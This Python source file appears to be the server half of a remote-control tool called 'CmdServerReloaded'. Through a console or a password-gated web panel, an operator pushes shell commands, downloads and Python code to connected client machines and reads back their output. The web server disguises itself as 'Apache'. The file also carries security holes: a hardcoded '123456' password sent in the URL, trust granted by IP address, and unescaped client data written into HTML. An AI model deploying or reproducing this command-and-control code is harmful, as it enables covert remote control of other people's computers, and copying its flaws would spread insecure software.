import os
import sys
import time
import random
import traceback
from urllib.parse import unquote
import base64
from http.server import HTTPServer, BaseHTTPRequestHandler, SimpleHTTPRequestHandler
from threading import Thread
import socket
server_port = [8631, 8632, 34568]
enable_password = True
password = "123456"
# TO-DO:log系统


def base64encode(string):
    return base64.b64encode(string.encode()).decode()


def base64decode(string):
    return base64.b64decode(string.encode()).decode()


def generateMessageId():
    return "".join(random.choices("1234567890qwertyuiopasdfghjklzxcvbnm", k=6))


fallbacks = {}
s = socket.socket()
s.bind(('0.0.0.0', server_port[0]))
s.listen()
n = 0
connects = []
trusted = []
no_fallback_time = 0


def no_fallback_time_count():
    global no_fallback_time
    global fallbacks
    while True:
        no_fallback_time += 1
        if no_fallback_time >= 10:
            fallbacks = {}
        time.sleep(1)


def send_message(x, type, message):
    id = generateMessageId()
    connects[x]["connection"].send(
        f"{type}|{base64encode(message)}|{id}".encode("UTF-8"))
    return id


def start_input_thread():
    global password
    global trusted
    global enable_password
    global connects
    while True:
        l = input("> ")
        i = l.split(" ")
        try:
            if i[0] == "help":
                print('''=> CmdServerReloaded Server Commands Help
help -- show this page
send <id> <type> <message> -- send message to client
trust <addr> -- trust an address
distrust <addr> -- distrust an address
trusted -- show trusted list
password -- show password
changePassword <password> -- change password
enablePassword <bool> -- enable or disable password
list -- show client list
disconnect <id> -- disconnect a client
exit -- stop server''')
            elif i[0] == "exit":
                os._exit(0)
            elif i[0] == "send":
                send_message(int(i[1]), i[2], i[3])
                print("=> message sent to " + i[1])
            elif i[0] == "trust":
                trusted.append(i[1])
                print("=> " + i[1] + " trusted")
            elif i[0] == "distrust":
                trusted.remove(i[1])
                print("=> " + i[1] + " removed from trusted")
            elif i[0] == "trusted":
                print("=> trusted list: " + str(trusted))
            elif i[0] == "password":
                print("=> password is " + password)
            elif i[0] == "changePassword":
                password = i[1]
                print("=> password change to " + password)
            elif i[0] == "enablePassword":
                enable_password = bool(i[1])
                print("=> enable password set to " + str(enable_password))
            elif i[0] == "list":
                print("=> client list (id|address|username|status)")
                for x in range(len(connects)):
                    print(
                        f"{str(x)} | {connects[x]['address']} | {connects[x]['username']} | {connects[x]['status']}")
            elif i[0] == "disconnect":
                connects[int(i[1])]["status"] = False
                print("=> client " + i[1] + " disconnected")
            else:
                print("=> unknown command. type help for help.")
        except BaseException:
            print("=> command error:\n" + traceback.format_exc())


def start_tcp_server():
    global n
    global connects
    global s
    while True:
        c, addr = s.accept()
        connects.append({"connection": c, "address": addr,
                         "username": "", "status": True})
        messageid = send_message(n, "username", "username")
        for _ in range(10):
            time.sleep(0.25)
            try:
                username = f'''{base64decode(fallbacks[messageid])}'''.replace(
                    "\n", "")
                connects[n]["username"] = username
                break
            except BaseException:
                print(traceback.format_exc())
        print(f"{n}{addr}Connected")
        n += 1


class Request(BaseHTTPRequestHandler):
    timeout = 5
    server_version = "Apache"

    def do_GET(self):
        global trusted
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        req = str(self.raw_requestline, 'iso-8859-1')
        ireq = str(
            req.replace(
                "GET ",
                "").replace(
                " HTTP/1.1",
                "").replace(
                "\n",
                ""))
        buf = ireq
        print(ireq)
        print(self.address_string())
        if self.address_string() in trusted or not enable_password:
            if ireq[0:6] == "/index":
                v = ""
                for i in range(len(connects)):
                    v += f'''<tr><td>{str(i)}</td>
                    <td>{connects[i]["address"]}</td>
                    <td>{connects[i]["username"]}</td>
                    <td>{connects[i]["status"]}</td>
                    <td><a href="../send-page/{str(i)}"><input type="button" value="Send"></a></td></tr>'''.replace("\n", "")
                buf = f'''{ireq}<table border="1">
                    <tr>
                        <td>ID</td>
                        <td>Address</td>
                        <td>Username</td>
                        <td>Status</td>
                        <td></td>
                    </tr>
                    {v}
                    </table>'''.replace("\n", "<br>")
            elif ireq[0:11] == "/send-page/":  # /send-page/0
                id = ireq.replace("/send-page/", "")
                if connects[int(id)]["status"]:
                    buf = ireq + '''
                    <select id="type">
                    <option value="cmd">cmd</option>
                    <option value="download">download</option>
                    <option value="python">python</option>
                    <option value="message">message</option>
                    </select><input id="message" value="">
                    <script>
                    function send(){document.getElementById("req").src="../send-api/''' + id.replace("\n", "") + '''/"+document.getElementById("type").value+"/"+document.getElementById("message").value}
                    </script>
                    <input type="button" onclick="send();" value="Send"><br>
                    <iframe id="req" src="" style="width:100%;height:90%"></iframe>'''
                    buf = buf.replace("\n", "").replace("\r", "")
                else:
                    buf = ireq + f'''Client {id} Offline.'''

            elif ireq[0:10] == "/send-api/":  # /send-api/0/message/114514
                # ['0','message','114514']
                v = ireq.replace("/send-api/", "").split("/")
                try:
                    messageid = send_message(int(v[0]), v[1], unquote(v[2]))
                    buf = f"{ireq}Done"
                    for _ in range(20):
                        time.sleep(0.25)
                        try:
                            buf = f'''{base64decode(fallbacks[messageid])}'''.replace(
                                "\n", "<br>")
                            break
                        except BaseException:
                            print(traceback.format_exc())
                    # print(fallbacks[messageid])
                except ConnectionResetError:
                    connects[int(v[0])]["status"] = False
                    buf = f'''{ireq}Client Offline.'''

            else:
                buf = ireq + " Nothing is here."
        else:
            if ireq[0:14] == "/password-api/":  # /password-api/123456
                ipassword = unquote(
                    ireq.replace(
                        "/password-api/",
                        "").replace(
                        "\n",
                        "").replace(
                        "\r",
                        ""))
                if ipassword == password:
                    buf = ireq + '''<a href="../index">Verified.</a>'''
                    trusted.append(self.address_string())
                else:
                    buf = ireq + '''<a href="../">Incorrect password.</a>'''
            else:
                buf = ireq + '''
                <script>
                function verify(){
                window.location.href="../password-api/"+document.getElementById("password").value;}
                </script>
                Please Input Password:
                <input id="password" value="">
                <input type="button" value="Submit" onclick="verify();">'''.replace("\n", "")
        self.wfile.write(buf.encode("gb2312"))


def start_web_ui():
    HTTPServer(('0.0.0.0', server_port[2]), Request).serve_forever()


def start_fallback_server():
    global fallbacks
    global no_fallback_time
    s2 = socket.socket()
    s2.bind(('0.0.0.0', server_port[1]))
    s2.listen()
    while True:
        c, addr = s2.accept()
        d = c.recv(1024000).decode('UTF-8')
        # print(d)
        data = d.split("|")
        no_fallback_time = 0
        fallbacks[data[0]] = data[1]


if __name__ == "__main__":
    Thread(target=start_tcp_server).start()
    Thread(target=start_input_thread).start()
    Thread(target=start_web_ui).start()
    Thread(target=start_fallback_server).start()
    Thread(target=no_fallback_time_count).start()
